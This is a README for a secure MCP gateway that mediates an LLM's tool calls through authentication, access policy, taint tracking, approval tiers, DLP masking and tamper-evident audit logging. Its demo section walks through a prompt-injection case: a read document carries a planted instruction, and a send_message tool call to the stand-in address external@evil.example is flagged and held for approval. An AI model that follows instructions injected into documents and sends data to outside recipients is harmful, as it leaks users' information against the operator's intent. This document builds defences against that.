# Secure MCP Gateway — working build (no GPU required)

A runnable implementation of the **MCP Gateway control plane** from
`MCP-Secure-Architecture-v10-Final-BuildSpec.md` §4.4. It builds now, on this
machine, with **no GPU**: the only GPU-dependent part (the LLM) sits behind a
mock adapter and is swapped for vLLM later by changing one config value.

The two production **MCP servers are intentionally not chosen yet**. Two
throwaway reference servers (`servers/docs_server.py`, `servers/actions_server.py`)
stand in so the gateway can be exercised end-to-end; they are deleted after the
pilot, exactly as the build plan describes.

## What it enforces (each maps to the spec + the v7 flaw it closes)

| Control | Where | Spec / flaw |
|---|---|---|
| **TPM+PIN two-factor auth** — X.509 client cert (PIN-sealed key) + proof-of-possession → short-lived **ES256** tokens **bound to the cert** (RFC 8705 `cnf.x5t#S256`, `amr:[cert,pin]`); anti-hammering lockout; Tier-3 **step-up** (RFC 9470); identity revocation kill-switch | `app/auth.py`, `app/pki.py` | §4.1 / A3 |
| ABAC: role × clearance × classification × tool tier, deny-by-default | `app/authz.py`, `policy.yaml` | §4.1, §5 / B5 |
| Tool risk registry (gateway-owned) + **hash pinning / rug-pull auto-quarantine** | `app/registry.py` | §4.4.3 / B4 |
| **Prompt-injection containment**: taint tracking, tainted args can never auto-execute a write | `app/taint.py`, `app/gateway.py` | §4.5 / B1 |
| Tiered HITL (0 auto → 1 policy → 2 human → 3 two-person) + separation of duties | `app/approvals.py` | §5 / B3 |
| **Unicode/RTL defense** (NFKC, strip bidi/zero-width) | `app/unicode_guard.py` | §4.4.7 / B13 |
| **DLP**: Saudi National ID/Iqama/IBAN detection + checksum + clearance-gated masking | `app/dlp.py` | §4.8 / B8 |
| Tamper-**proof HMAC-SHA256 hash-chained** audit (keyed, not a bare hash) + content minimization (digests, not raw PII) | `app/audit.py` | §4.9 / B10 |
| Kill switch (global/server/tool/user) + rate limiting | `app/controls.py` | §4.4.8 |
| Protocol hardening: schema-shaped args, size limits on args & results | `app/gateway.py` | §4.4.5 / B12 |
| **LLM adapter = the single GPU swap point** | `app/llm.py` | §4.3 / A1 |

## Run it

```bash
cd gateway
pip install fastapi uvicorn "pyjwt[crypto]" cryptography pyyaml pytest httpx mcp

# start (mock LLM, no GPU). On first run the dev PKI (CA, ES256 signing key,
# per-user client certs) is generated under gateway/pki/.
python -m uvicorn app.main:app --host 127.0.0.1 --port 8800
# open http://127.0.0.1:8800/
```

**Login is two-factor: TPM-bound certificate + PIN — no passwords.** Factor 1 is a
CA-issued client certificate whose private key is TPM-sealed (here: PKCS#8 encrypted
under the PIN); factor 2 is the PIN that unlocks it. The gateway verifies
proof-of-possession (which requires the PIN) and issues a short-lived ES256 token
bound to the certificate. A username alone gets you nothing; 5 wrong PINs lock the
identity. The browser demo runs this server-side via `/api/dev/login` (disabled in
production via `dev_login_enabled: false`).

**Demo users:** `sara` (employee) · `khalid` (analyst) · `noura` & `faisal`
(approvers) · `admin`. **Per-user demo PINs are shown on the login screen** (from
`/api/dev/users`) and stored in `pki/dev_pins.json` (dev only — absent in production).

### Things to try in the UI
- As **sara**: `search payroll` → Saudi PII comes back **masked** (her clearance < secret).
- As **khalid**: `search payroll` → same data **unmasked** (clearance ≥ secret).
- As **admin**: `read document 4`, then
  `#call actions.send_message {"recipient":"external@evil.example","body":"..."}`
  → the injected recipient is flagged **TAINTED** and routed to **approval**, not executed.
- As **admin**: `#call actions.delete_record {"record_id":"8"}` → **Tier 3**, needs
  two distinct approvers (noura + faisal); admin (the requester) is blocked from approving.
- **Admin tab**: watch the audit chain ("chain intact: N records"), tool registry
  tiers, and the kill switch.

## Test it

```bash
python -m pytest tests/test_security.py tests/test_auth.py tests/test_fuzz.py -q  # 53 unit + fuzz
# start the server, then:
python -m pytest tests/test_e2e.py -q           # 22 end-to-end HTTP tests
```

## When the GPUs arrive (the only change)

Edit `config.yaml`:

```yaml
llm:
  provider: openai_compat          # was: mock
  base_url: "http://<vllm-host>:8000/v1"
  model: "qwen3.5"
```

`app/llm.py` already implements the OpenAI-compatible tool-calling path against
vLLM. No other module changes: authorization, taint, HITL, DLP, and audit all
sit above the adapter. The planner now comes from the real model; every control
in the table above still runs on the model's proposed tool calls.

## Other production swap points (marked in code)
- `app/auth.py` + `app/pki.py` — dev cert auth (local CA, on-disk signing key,
  server-side challenge signing) → Keycloak + AD/LDAP **X.509 CBA**, token-signing
  key in **OpenBao Transit / YubiHSM**, per-user key in the **workstation TPM 2.0**,
  and the cert thumbprint injected by the **mTLS-terminating sidecar**. See
  `../MCP-Authentication-Redesign-Plan.md`.
- `app/mcp_manager.py` — stdio transport → Streamable HTTP + mTLS + SPIFFE.
- `app/audit.py` — local hash-chained JSONL → WORM store + SIEM stream.
- `app/dlp.py` — deterministic detectors → add offline Arabic NER (3-point pipeline).
- Registry `status` — dev auto-activates new tools → production requires Risk-Board approval.

## Completed to 100% software-ready
See `GATEWAY-COMPLETION-PLAN.md` and `OPERATIONS.md`. Beyond the controls table, the
gateway now includes: **persistent** HITL approvals + identity revocation (survive restart);
**working credential vault** with per-call dynamic secrets injected at dispatch (never in model
context/audit); **registry onboarding governance** (Risk-Board approval of new tools);
**three-key rate limiting** (user/tool/server); **circuit breaker** per server; **external-IdP
(Keycloak/OIDC) auth mode**; **startup config validation**; **metrics + SIEM export**; and
**deployment artifacts** (`requirements.txt`, `Dockerfile`, `docker-compose.yml`, CI); **NDMO
classification propagation**; **strict tool-arg schema validation** (`additionalProperties:false`);
parser-fuzz suite; OpenBao vault adapter. **75 tests green.**

## Operator-provided infrastructure (seams ready, not buildable on a dev box)
Production MCP server selection; real vLLM+GPU; HSM + workstation TPM; a Keycloak host
(`auth.mode: oidc`); TLS 1.3 + mTLS terminator + SPIFFE; SIEM product; DR site; confidential
computing; Arabic NER model. These are later phases in `MCP-Platform-Build-Plan.md`.
